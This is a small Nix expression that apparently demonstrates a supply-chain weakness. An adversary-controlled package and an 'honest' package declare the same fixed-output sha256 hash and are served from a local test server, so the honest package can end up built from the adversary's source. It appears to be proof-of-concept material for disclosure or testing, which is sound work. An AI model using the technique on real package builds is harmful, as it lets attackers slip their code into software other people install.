# To test this, simulate a web server with:
# $ nix-shell -p simple-http-server
# $ simple-http-server -p 8042
{ pkgs ? import <nixpkgs> {} }:
pkgs.callPackage ({stdenv, fetchzip}:
  let iconpackage = stdenv.mkDerivation rec {
        pname = "iconpackage";
        version = "42.0";
        src = fetchzip {
          url = "http://localhost:8042/iconpackage-${version}.tar.gz"; # <-- this is controlled by the adversary
          sha256 = "sha256-kACAk1+Se9vaJN8FkqLRJsOI7szD9zw015nCxxT54bs=";
        };
        buildPhase = ":";
        installPhase = ''
          mkdir -p $out/share/icons/hicolor/64x64/apps/
          mv myicon.png $out/share/icons/hicolor/64x64/apps/
        '';     
      };
      honestpackage = stdenv.mkDerivation rec {
        pname = "honestpackage";
        version = "1.0";
        src = fetchzip {
          url = "http://localhost:8042/honestpackage-${version}.tar.gz"; # <-- this is NOT controlled by the adversary
          sha256 = "sha256-kACAk1+Se9vaJN8FkqLRJsOI7szD9zw015nCxxT54bs=";
        };
        buildInputs = [ iconpackage ];
        buildPhase = ":";
        installPhase = ''
          mkdir -p $out/bin
          mv honestpackage.sh $out/bin
        '';
      };
  in honestpackage
) {}
